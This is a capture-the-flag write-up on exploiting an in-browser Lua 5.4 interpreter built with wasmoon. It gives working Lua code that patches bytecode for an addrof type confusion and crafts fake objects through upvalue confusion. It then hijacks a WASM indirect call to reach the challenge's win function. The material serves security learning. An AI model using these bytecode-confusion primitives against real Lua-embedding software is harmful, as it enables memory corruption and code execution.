---
title: "AlcaWASM Challenge Writeup - Pwning an In-Browser Lua Interpreter"
description: "Gamedevs of the world, unite! Your favourite language is in danger -- the l33t wrongdoers have figured out how to BYOB (Bring Your Own Bytecode) and pwn the Lua v5.4 interpreter!"
date: 2024-09-12T12:30:00+01:00
tags: ["writeup", "pwn", "wasm", "lua"]
draft: false
---

![Escape from alcawasm!](/images/alcawasm_wide.jpg)

## Introduction

At some point, some weeks ago, I've stumbled upon [this fascinating read](https://memorycorruption.net/posts/rce-lua-factorio/).
In it, the author thoroughly explains an RCE
(Remote Code Execution) they found on the Lua interpreter used in the
[Factorio](https://www.factorio.com/) game. I heartily recommend anyone
interested in game scripting, exploit development, or just cool low-level hacks,
to check out the blogpost -- as it contains a real wealth of insights.

The author topped this off by releasing a companion challenge to the writeup;
it consists of a Lua interpreter, running in-browser, for readers to exploit on
their own. Solving the challenge was a fun ride and a great addition to the content!

The challenge is different enough from the blogpost that it makes
sense to document a writeup. Plus, I find enjoyment in writing, so there's that.

I hope you'll find this content useful in your journey :)

> Instead of repeating concepts that are - to me - already well explained
> in that resource, I have decided to focus on the new obstacles that I
> faced while solving the challenge, and on new things I learned in the process.
> If at any point the content of the writeup becomes cryptic, I'd suggest consulting
> the blogpost to get some clarity on the techniques used.

## The Lab

The challenge is available for anyone at [https://alcawasm.memorycorruption.net/](https://alcawasm.memorycorruption.net/)
(and it does not require any login or registration).

When visiting it, you're welcomed by the following UI:

![AltImage](/images/alcawasm_ui.png)

These are the details of each section:

- *Editor*: an [embedded VSCode](https://github.com/microsoft/monaco-editor) for
  convenient scripting.
- *Console*: a console connected to the output of the Lua interpreter.
- *Definitions*: Useful definitions of the Lua interpreter, including paddings.
- *Goals*: a list of objectives towards finishing the challenge. They automatically
  update when a goal is reached, but I've found this to be a bit buggy, TBH.
  
Working on the UI is not too bad, but I strongly suggest to copy-paste the code
quite often -- I don't know how many times I've typed CMD+R instead of CMD+E
(the shortcut to execute the code), reloading the page and losing my precious
experiments.

## Information Gathering

After playing for a bit with the interpreter, I quickly decided I wanted
to save some time for my future self by understanding the environment a little
bit better.

> Note: this is, in my experience, a great idea. Always setup your lab!

Luckily, this is as easy as opening DevTools and using our uberly refined
l33t intuition skills to find how the Lua interpreter was embedded in the browser:

![AltText](/images/alcawasm_osint_1.png)

and a bit of GitHub...

![AltText](/images/alcawasm_osint2.png)

With these mad OSINT skillz, I learned that the challenge is built with [wasmoon](https://github.com/ceifa/wasmoon),
a package that compiles the Lua v5.4 repository to WASM and then provides
JS bindings to instantiate and control the interpreter.

This assumption is quickly corroborated by executing the following:

```lua
print(_VERSION)
```

This prints out `Lua 5.4` (you should try executing that code
to start getting comfortable with the interface).

This information is valuable for exploitation purposes, as it gives us the
source code of the interpreter, which can be fetched
by cloning [the lua repository](https://github.com/lua/lua/tree/v5.4).

Let's dive in!

## Wait, it's all TValues?

The first goal of the challenge is to gain the ability to leak addresses
of TValues (Lua variables) that we create -- AKA the *addrof* primitive.

In the linked blogpost, the author shows how to confuse types in a for-loop
to gain that. In particular, they use the following code to leak addresses:

```lua
asnum = load(string.dump(function(x)
    for i = 0, 1000000000000, x do return i end
end):gsub("\x61\0\0\x80", "\x17\0\0\128"))

foo = "Memory Corruption"

print(asnum(foo))
```

> The `gsub` call patches the bytecode of the function to replace the `FORPREP`
> instruction. Without the patch, the interpreter would raise an error
> due to a non-numeric `step` parameter.

Loading this code in the challenge interface leads to an error:

```
Error: [string "asnum = load(string.dump(function(x)..."]:2: bad 'for' step (number expected, got string)
```


This is not too surprising, isn't it? Since we are dealing with a different
version of the interpreter, the bytes used in the `gsub` patch are probably wrong.

### Fixing the patch

No worries, though, as the interpreter in the challenge is equipped with two
useful features:

- `asm` -> assembles Lua instructions to bytes
- `bytecode` -> pretty-prints the bytecode of the provided Lua function

Let's inspect the bytecode of the for loop function to understand
what is there we have to patch:

```
# Code
asnum = load(string.dump(function(x)
    for i = 0, 1000000000000, x do return i end
end))

print(bytecode(asnum))

# Output
function <(string):1,3> (7 instructions at 0x1099f0)
1 param, 5 slots, 0 upvalues, 5 locals, 1 constant, 0 functions
	1	7fff8081	[2]	LOADI    	1 0
	2	00000103	[2]	LOADK    	2 0	; 1000000000000
	3	00000180	[2]	MOVE     	3 0
	4	000080ca	[2]	FORPREP  	1 1	; exit to 7 <--- INSTRUCTION to PATCH
	5	00020248	[2]	RETURN1  	4
	6	000100c9	[2]	FORLOOP  	1 2	; to 5
	7	000100c7	[3]	RETURN0  	
constants (1) for 0x1099f0:
	0	1000000000000
locals (5) for 0x1099f0:
	0	x	1	8
	1	(for state)	4	7
	2	(for state)	4	7
	3	(for state)	4	7
	4	i	5	6
upvalues (0) for 0x1099f0:
```

The instruction to patch is the `FORPREP`. Represented in little endian,
its binary value is `0xca800000`.

We will patch it with a `JMP 1`. by doing so, the flow will jump to the
`FORLOOP` instruction, which will increment the index with the value of the `x` step
parameter. This way, by leveraging the type confusion, the returned
index will contain the address of the TValue passed as input.

The next step is to assemble the target instruction:

```lua
# Code
print(string.format("%4x", asm("JMP", 1, 0)))

# Output
80000038
```

And we can then verify that the patching works as expected:

```
# Code
asnum = load(string.dump(function(x)
    for i = 0, 1000000000000, x do return i end
end):gsub("\xca\x80\0\0", "\x38\0\0\x80"))

print(bytecode(asnum))

# Output
function <(string):1,3> (7 instructions at 0x10df28)
1 param, 5 slots, 0 upvalues, 5 locals, 1 constant, 0 functions
	1	7fff8081	[2]	LOADI    	1 0
	2	00000103	[2]	LOADK    	2 0	; 1000000000000
	3	00000180	[2]	MOVE     	3 0
	4	80000038	[2]	JMP      	1	; to 6 <--- PATCHING WORKED!
	5	00020248	[2]	RETURN1  	4
	6	000100c9	[2]	FORLOOP  	1 2	; to 5
	7	000100c7	[3]	RETURN0  	
constants (1) for 0x10df28:
	0	1000000000000
locals (5) for 0x10df28:
	0	x	1	8
	1	(for state)	4	7
	2	(for state)	4	7
	3	(for state)	4	7
	4	i	5	6
upvalues (0) for 0x10df28:
```

### Leak Denied

By trying to leak a TValue result with the type confusion,
something is immediately off:

```
# Code
asnum = load(string.dump(function(x)
    for i = 0, 1000000000000, x do return i end
end):gsub("\xca\x80\0\0", "\x38\0\0\x80"))

foo = function() print(1) end
print("foo:", foo)

print("leak:",asnum(foo))

# Output
foo:	LClosure: 0x10a0c0
leak:     <--- OUTPUT SHOULD NOT BE NULL!
```

> As a reliable way to test the addrof primitive,
> I am using functions. In fact, by default, when passing
> a function variable to the print function in Lua,
> the address of the function is displayed. We can use this
> to test if our primitive works.

From this test, it seems that the for loop is not returning the
address leak we expect. To find out the reason about this, I took a little break and inspected
the function responsible for this in the source code. The relevant snippets follow:

```c
[SNIP]
      vmcase(OP_FORLOOP) {
        StkId ra = RA(i);
        if (ttisinteger(s2v(ra + 2))) {  /* integer loop? */
          lua_Unsigned count = l_castS2U(ivalue(s2v(ra + 1)));
          if (count > 0) {  /* still more iterations? */
            lua_Integer step = ivalue(s2v(ra + 2));
            lua_Integer idx = ivalue(s2v(ra));  /* internal index */
            chgivalue(s2v(ra + 1), count - 1);  /* update counter */
            idx = intop(+, idx, step);  /* add step to index */
            chgivalue(s2v(ra), idx);  /* update internal index */
            setivalue(s2v(ra + 3), idx);  /* and control variable */
            pc -= GETARG_Bx(i);  /* jump back */
          }
        }
        else if (floatforloop(ra))  /* float loop */ <--- OUR FLOW GOES HERE
          pc -= GETARG_Bx(i);  /* jump back */
        updatetrap(ci);  /* allows a signal to break the loop */
        vmbreak;
      }

[SNIP]

/*
** Execute a step of a float numerical for loop, returning
** true iff the loop must continue. (The integer case is
** written online with opcode OP_FORLOOP, for performance.)
*/
static int floatforloop (StkId ra) {
  lua_Number step = fltvalue(s2v(ra + 2));
  lua_Number limit = fltvalue(s2v(ra + 1));
  lua_Number idx = fltvalue(s2v(ra));  /* internal index */
  idx = luai_numadd(L, idx, step);  /* increment index */
  if (luai_numlt(0, step) ? luai_numle(idx, limit) <--- CHECKS IF THE LOOP MUST CONTINUE
                          : luai_numle(limit, idx)) {
    chgfltvalue(s2v(ra), idx);  /* update internal index */ <--- THIS IS WHERE THE INDEX IS UPDATED
    setfltvalue(s2v(ra + 3), idx);  /* and control variable */
    return 1;  /* jump back */
  }
  else
    return 0;  /* finish the loop */
}

```

Essentially, this code is doing the following:

- If the loop is an integer loop (e.g. the TValue step has an integer type),
  the function is computing the updates and checks inline (but we don't really
  care as it's not our case).
- If instead (as in our case) the step TValue is not an integer, execution reaches
  the *floatforloop* function, which takes care of updating the index and
  checking the limit.
  - The function increments the index and **checks
  if it still smaller than the limit**. In that case, the
  index will be updated and the for loop continues -- this is what we want!

We need to make sure that, once incremented with the `x` step (which, remember,
is the address of the target TValue), the index is not greater than the limit
(the number 1000000000000, in our code). Most likely, the problem here is that
the leaked address, interpreted as an IEEE 754 double, is bigger than the constant
used, so the execution never reaches the `return i` that would return the leak.

We can test this assumption by slightly modifying the code to add a return value
after the for-loop ends:

```lua
# Code
asnum = load(string.dump(function(x)
    for i = 0, 1000000000000, x do return i end
    return -1 <--- IF x > 1000000000000, EXECUTION WILL GO HERE 
end):gsub("\xca\x80\0\0", "\x38\0\0\x80"))

foo = function() print(1) end
print("foo:", foo)

print("leak:",asnum(foo))

# Output
foo:	LClosure: 0x10df18
leak:	-1 <--- OUR GUESS IS CONFIRMED
```

There's a simple solution to this problem: **by using x as both the step and
the limit, we are sure that the loop will continue to the return statement.**

The leak experiment thus becomes:

```lua
# Code
asnum = load(string.dump(function(x)
    for i = 0, x, x do return i end
end):gsub("\xca\x80\0\0", "\x38\0\0\x80"))

foo = function() print(1) end
print("foo:", foo)

print("leak:",asnum(foo))

# Output
foo:	LClosure: 0x10a0b0
leak:	2.3107345851353e-308
```

Looks like we are getting somewhere.

However, the clever will notice that the address of the function and the
printed leaks do not seem to match. This is well explained in the original writeup:
Lua thinks that the returned address is a double, thus it will use the IEEE 754 representation.
Indeed, in the blogpost, the author embarks on an adventurous quest to natively transform
this double in the integer binary representation needed to complete the addrof
primitive.

**We don't need this.** In fact, since Lua 5.3, the interpreter supports
integer types!

This makes completing the addrof primitive a breeze,
by resorting to the native `string.pack` and `string.unpack` functions:

```
# Code
asnum = load(string.dump(function(x)
    for i = 0, x, x do return i end
end):gsub("\xca\x80\x00\x00", "\x38\x00\x00\x80"))

function addr_of(variable)
  return string.unpack("L", string.pack("d", asnum(variable)))
end

foo = function() print(1) end
print("foo:", foo)

print(string.format("leak: 0x%2x",addr_of(foo)))
# Output
foo:	LClosure: 0x10a0e8
leak: 0x10a0e8
```

Good, our leak now finally matches the function address!

> Note: another way to solve the limit problem is to use the maximum
> double value, which roughly amounts to 2^1024.

## Trust is the weakest link

The next piece of the puzzle is to find a way to craft fake objects.

For this, we can pretty much use the same technique used in the blogpost:

```lua
# Code 

confuse = load(string.dump(function()
    local foo
    local bar
    local target
    return (function() <--- THIS IS THE TARGET CLOSURE WE ARE RETURNING
      (function()
        print(foo)
        print(bar)
        print("Leaking outer closure: ",target) <--- TARGET UPVALUE SHOULD POINT TO THE TARGET CLOSURE
      end)()
    end)
end):gsub("(\x01\x00\x00\x01\x01\x00\x01)\x02", "%1\x03", 1))

outer_closure = confuse()
print("Returned outer closure:", outer_closure)

print("Calling it...")
outer_closure()


# Output

Returned outer closure:	LClosure: 0x109a98
Calling it...
nil
nil
Leaking outer closure: 	LClosure: 0x109a98 <--- THIS CONFIRMS THAT THE CONFUSED UPVALUE POINTS TO THE RIGHT THING
```

Two notable mentions here:

1. Again, in order to make things work with this interpreter I had to change
  the bytes in the patching. In this case, as the patching happens not in
  the opcodes but rather in the upvalues of the functions, I resorted
  to manually examining the bytecode dump to find a pattern that seemed
  the right one to patch -- in this case, what we are patching is the
  "upvals table" of the outer closure.

2. We are returning the outer closure to verify that the upvalue confusion
   is working. In fact, in the code, I'm printing the address of the outer closure
  (which is returned by the function), and printing the value of the
  patched target upvalue, and expecting them to match.
  
From the output of the interpreter, we confirm that we have
successfully confused upvalues.

## If it looks like a Closure

Ok, we can leak the outer closure by confusing upvalues.
But can we overwrite it? Let's check:

```lua

# Code

confuse = load(string.dump(function()
    local foo
    local bar
    local target
    return (function()
      (function()
        print(foo)
        print(bar)
        target = "AAAAAAAAA"
      end)()
      return 10000000
    end)(), 1337
end):gsub("(\x01\x00\x00\x01\x01\x00\x01)\x02", "%1\x03", 1))

confuse()

# Output

nil
nil
RuntimeError: Aborted(segmentation fault)

```

**Execution aborted with a segmentation fault.**

To make debugging simple, and ensure that the segmentation fault
depends on a situation that I could control, I've passed the same
script to the standalone Lua interpreter cloned locally, built with
debugging symbols.

What we learn from GDB confirms this is the happy path:

![AltText](/images/alcawasm_gdb1.png)

After the inner function returns, the execution
flow goes back to the outer closure. In order to
execute the `return 100000000` instruction, the
interpreter will try fetching the _constants table_
from the closure -> which will end up in error because
the object is not really a closure, but a string, **thanks
to the overwrite in the inner closure.**

...except this *is not at all* what is happening in the challenge.

### Thanks for all the definitions

If you try to repeatedly execute (in the challenge UI) the script above,
you will notice that sometimes the error appears as a segmentation fault,
other times as an aligned fault, and other times it does not even errors.

The reason is that, probably due to how `wasmoon` is compiled (and the
fact that it uses WASM), some of the pointers and integers will have
a 32 bit size, instead of the expected 64. The consequence of this is that
many of the paddings in the structs will not match what we have in standalone
Lua interpreter!

> Note: while this makes the usability of the standalone Lua as a debugging tool...questionable,
> I think it was still useful and therefore I've kept it in the writeup.

This could be a problem, for our exploit-y purposes. In the linked blogpost,
the author chooses the path of a fake constants table
to craft a fake object. This is possible because of two facts:

1. In the LClosure struct, the address of its Proto struct, which holds
   among the other things the constants values, is placed
   **24 bytes after the start of the struct**.
2. In the TString struct, the content of the string is placed
   **24 bytes after the start of the struct**.

Therefore, when replacing an LClosure with a TString via upvalues confusion,
the two align handsomely, and the attacker thus controls the Proto pointer,
making the chain work.

However, here's the definitions of LClosure and TString for the challenge:

```c
struct TString {
    +0: (struct GCObject *) next
    +4: (typedef lu_byte) tt
    +5: (typedef lu_byte) marked
    +6: (typedef lu_byte) extra
    +7: (typedef lu_byte) shrlen
    +8: (unsigned int) hash
    +12: (union {
        size_t lnglen;
        TString *hnext;
    }) u
    +16: (char[1]) contents <--- CONTENTS START AFTER 16 BYTES
}

...

struct LClosure {
    +0: (struct GCObject *) next
    +4: (typedef lu_byte) tt
    +5: (typedef lu_byte) marked
    +6: (typedef lu_byte) nupvalues
    +8: (GCObject *) gclist
    +12: (struct Proto *) p <--- PROTO IS AFTER 12 BYTES
    +16: (UpVal *[1]) upvals
}
```

Looking at the definition, it is now clear why the technique
used in the blogpost would not work in this challenge:
because even if we can confuse a TString with an LClosure,
the bytes of the Proto pointer are **not under our control**!

![AltText](/images/alcawasm_closure_meme.jpg)

Of course, there is another path.

### Cheer UpValue

In the linked blogpost, the author mentions another way of crafting
fake objects that doesn't go through overwriting the Prototype pointer.
Instead, it uses upvalues.

By looking at the definitions listed previously, you might have noticed that,
while the Proto pointer in the LClosure cannot be controlled with
a TString, the pointer to the `upvals` array is instead nicely
aligned with the start of the string contents.

Indeed, the author mentions that fake objects can be created via
upvalues too (but then chooses another road).

To see how, we can inspect the code of the `GETUPVAL` opcode in Lua,
the instruction used to retrieve upvalues:

```c

struct UpVal {
    +0: (struct GCObject *) next
    +4: (typedef lu_byte) tt
    +5: (typedef lu_byte) marked
    +8: (union {
        TValue *p;
        ptrdiff_t offset;
    }) v
    +16: (union {
        struct {
            UpVal *next;
            UpVal **previous;
        };
        UpVal::(unnamed struct) open;
        TValue value;
    }) u
}

...

vmcase(OP_GETUPVAL) {
  StkId ra = RA(i);
  int b = GETARG_B(i);
  setobj2s(L, ra, cl->upvals[b]->v.p);
  vmbreak;
} 
```

The code visits the `cl->upvals` array, navigates to the bth element,
and takes the pointer to the TValue value `v.p`.

All in all, what we need to craft a fake object is depicted in the image below:

![AltText](/images/alcawasm_fakeobj.png)

This deserves a try!

## Unleash the beast

A good test of our object artisanship skills would be to create
a fake string and have it correctly returned by our `craft_object`
primitive. We will choose an arbitrary length for the string, and
then verify whether Lua agrees on its length once the object
is crafted. This should confirm the primitive works.

Down below, I will list the complete code of the experiment,
which implements the diagram above:

```lua
local function ubn(n, len)
  local t = {}
  for i = 1, len do
      local b = n % 256
      t[i] = string.char(b)
      n = (n - b) / 256
  end
  return table.concat(t)
end

asnum = load(string.dump(function(x)
    for i = 0, x, x do return i end
end):gsub("\xca\x80\x00\x00", "\x38\x00\x00\x80"))

function addr_of(variable)
  return string.unpack("L", string.pack("d", asnum(variable)))
end

-- next + tt/marked/extra/padding/hash + len
fakeStr = ubn(0x0, 12) .. ubn(0x1337, 4)
print(string.format("Fake str at: 0x%2x", addr_of(fakeStr)))

-- Value + Type (LUA_VLNGSTRING = 0x54)
fakeTValue = ubn(addr_of(fakeStr) + 16, 8) .. ubn(0x54, 1)
print(string.format("Fake TValue at: 0x%2x", addr_of(fakeTValue)))

-- next + tt/marked + v
fakeUpvals = ubn(0x0, 8) .. ubn(addr_of(fakeTValue) + 16, 8)
print(string.format("Fake Upvals at: 0x%2x", addr_of(fakeUpvals)))

-- upvals
fakeClosure = ubn(addr_of(fakeUpvals) + 16, 8)
print(string.format("Fake Closureat : 0x%2x", addr_of(fakeClosure)))

craft_object = string.dump(function(closure)
    local foo
    local bar
    local target
    return (function(closure)
      (function(closure)
        print(foo)
        print(bar)
        print(target)
        target = closure
      end)(closure)
      return _ENV
    end)(closure), 1337
end)

craft_object = craft_object:gsub("(\x01\x01\x00\x01\x02\x00\x01)\x03", "%1\x04", 1)
craft_object = load(craft_object)
crafted = craft_object(fakeClosure)
print(string.format("Crafted string length is %x", #crafted))
```

> Note: as you can see, in the outer closure, I am returning the faked object by
> returning the _ENV variable. This is the first upvalue of the closure, pushed
> automatically by the interpreter for internal reasons. This way,
> I am instructing the interpreter to return **the first upvalue**
> in the upvalues array, which points to our crafted UpValue.

The output of the script confirms that our object finally has citizenship:

```
Fake str at: 0x10bd60
Fake TValue at: 0x112c48
Fake Upvals at: 0x109118
Fake Closureat : 0x109298
nil
nil
LClosure: 0x10a280
Crafted string length is 1337 <--- WE PICKED THIS LENGTH!
```

## Escape from Alcawasm

In the linked blogpost, the author describes well the "superpowers"
that exploit developers gain by being able to craft fake objects.

Among these, we have:

- Arbitrary read
- Arbitrary write
- Control over the Instruction Pointer

In this last section, I'll explain why the latter is everything we
need to complete the challenge.

To understand how, it's time to go back to the information gathering.

### (More) Information Gathering

The description of the challenge hints that, in the WASM context,
there is some kind of "win" function that cannot be invoked
directly via Lua, and that's the target of our exploit.

Inspecting the JS code that instantiates the WASM assembly
gives some more clarity on this:

```javascript
  a || (n.global.lua.module.addFunction((e => {
      const t = n.global.lua.lua_gettop(e)
        , r = [];
      for (let a = 1; a <= t; a++)
          switch (n.global.lua.lua_type(e, a)) {
          case 4:
              r.push(n.global.lua.lua_tolstring(e, a));
              break;
          case 3:
              r.push(n.global.lua.lua_tonumberx(e, a));
              break;
          default:
              console.err("Unhandled lua parameter")
          }
      return 1 != r.length ? self.postMessage({
          type: "error",
          data: "I see the exit, but it needs a code to open..."
      }) : 4919 == r[0] ? self.postMessage({
          type: "win"
      }) : self.postMessage({
          type: "error",
          data: "Invalid parameter value, maybe more l333t needed?"
      }),
      0
  }
  ), "ii"),
```

Uhm, I'm no WASM expert, but it looks like this piece of code might just
be the "win" function I was looking for.

Its code is not too complex: the function takes a TValue *e* as input,
checks its value, converting it either to string or integer, and stores
the result into a JS array. Then, the value pushed is compared against
the number 4919 (0x1337 for y'all), and if it matches, the "win" message is
sent (most likely then granting the final achievement).

Looking at this, it seems what we need to do is to find a way to craft
a fake Lua function that points to the function registered by `n.global.lua.module.addFunction`,
and invoke it with the 0x1337 argument.

But how does that `addFunction` work, and how can we find it in the WASM context?

### Emscripten

Googling some more leads us to the nature of the `addFunction`:

https://emscripten.org/docs/porting/connecting_cpp_and_javascript/Interacting-with-code.html#calling-javascript-functions-as-function-pointers-from-c

> You can use addFunction to return an integer value that represents a function pointer.
> Passing that integer to C code then lets it call that value as a function pointer,
> and the JavaScript function you sent to addFunction will be called.

Thus, it seems that `wasmoon` makes use of Emscripten, the LLVM-based WASM toolchain,
to build the WASM module containing the Lua interpreter.

And, as it seems, Emscripten provides a way to register JavaScript functions
that will become "callable" in the WASM.
Digging a little more, and we see how the `addFunction` API is implemented:

https://github.com/emscripten-core/emscripten/blob/1f519517284660f4b31ef9b7f921bf6ba66c4041/src/library_addfunction.js#L196

```javascript
SNIP
    var ret = getEmptyTableSlot();

    // Set the new value.
    try {
      // Attempting to call this with JS function will cause of table.set() to fail
      setWasmTableEntry(ret, func);
    } catch (err) {
      if (!(err instanceof TypeError)) {
        throw err;
      }
  #if ASSERTIONS
      assert(typeof sig != 'undefined', 'Missing signature argument to addFunction: ' + func);
  #endif
      var wrapped = convertJsFunctionToWasm(func, sig);
      setWasmTableEntry(ret, wrapped);
    }

    functionsInTableMap.set(func, ret);

    return ret;

SNIP
  },
```

Essentially, <u> the function is being added to the WebAssembly [functions table](https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Table)</u>.

Now again, I'll not pretend to be a WASM expert -- and this is also why I
decided to solve this challenge. Therefore, I will not include too many
details on the nature of this functions table.

What I did understand, though, is that WASM binaries have a peculiar
way of representing function pointers. They are not actual "addresses"
pointing to code. Instead, function pointers are integer **indices** that
are used to reference tables of, well, functions. And a module can have
multiple function tables, for direct and indirect calls -- and no, I'm
not embarrassed of admitting I've learned most of this from ChatGPT.

Now, to understand more about this point, I placed a breakpoint in a pretty
random spot of the WebAssembly, and then restarted the challenge -- the
goal was to stop in a place where the chrome debugger had context on the
executing WASM, and explore from there.

The screenshot below was taken from the debugger, and it shows variables
in the scope of the execution:

![AltText](/images/alcawasm_table1.png)

Please notice the `__indirect_function_table` variable: it is filled
with functions, just as we expected.

Could this table be responsible for the interface with the win function?
To find this out, it should be enough to break at some place where we
can call the `addFunction`, call it a few times, then stop again inside
the wasm and check if the table is bigger:

![AltText](/images/alcawasm_addfunction.png)

And the result in the WASM context, afterwards:

![AltText](/images/alcawasm_table2.png)

Sounds like our guess was spot on! Our knowledge so far:

- The JS runner, after instantiating the WASM, invokes `addFunction` on it to register
  a win function
- The win function is added to the `__indirect_function_table`, and it can be called
  via its returned index
- The win function is the 200th function added, so we know the index (199)

The last piece, here, is figure out how to trigger an indirect call in WASM from
the interpreter, using the primitives we have obtained.

Luckily, it turns out this is not so hard!

### What's in an LClosure

In the blogpost, I've learned that crafting fake objects can be used
to control the instruction pointer.

This is as easy as crafting a fake string, and it's well detailed
in the blogpost. Let's try with the same experiment:

```lua

# Code
SNIP

-- function pointer + type
fakeFunction = ubn(0xdeadbeef, 8) .. ubn(22, 8)
fakeUpvals = ubn(0x0, 8) .. ubn(addr_of(fakeFunction) + 16, 8)
fakeClosure = ubn(addr_of(fakeUpvals) + 16, 8)

crafted_func = craft_object(fakeClosure)
crafted_func()

# Output
SNIP
RuntimeError: table index is out of bounds
```

The error message tells us that the binary is trying to
index a function at an index that is out of bound.

Looking at the debugger, this makes a lot of sense,
as the following line is the culprit for the error:

```
call_indirect (param i32) (result i32)
```

Bingo! This tells us that our fake C functoin is precisely
dispatching a WASM indirect call.

At this point, the puzzle is complete :)

### Platinum Trophy

Since we can control the index of an indirect
call (which uses the table of indirect functions)
and we know the index to use for the win function,
we can finish up the exploit, supplying the correct parameter:

```lua

# Code
-- function pointer (win=199) + type 
fakeFunction = ubn(199, 8) .. ubn(22, 8)
fakeUpvals = ubn(0x0, 8) .. ubn(addr_of(fakeFunction) + 16, 8)
fakeClosure = ubn(addr_of(fakeUpvals) + 16, 8)

crafted_func = craft_object(fakeClosure)

crafted_func(0x1337)
```

and...

![AltText](/images/alcawasm_win.png)

## Wrapping it up

Solving this challenge was true hacker enjoyment -- this is the joy of weird machines!

Before closing this entry, I wanted to congratulate the author of the
challenge (and of the attached blogpost). It is rare to find content of this quality.
Personally, I think that the idea of preparing challenges as companion content for
hacking writeups is a great honking ideas, and we should do more of it.

In this blogpost, we hacked with interpreters, confusions, exploitation primitives and
WASM internals. I hope you've enjoyed the ride, and I salute you until the next one.

Enjoy!
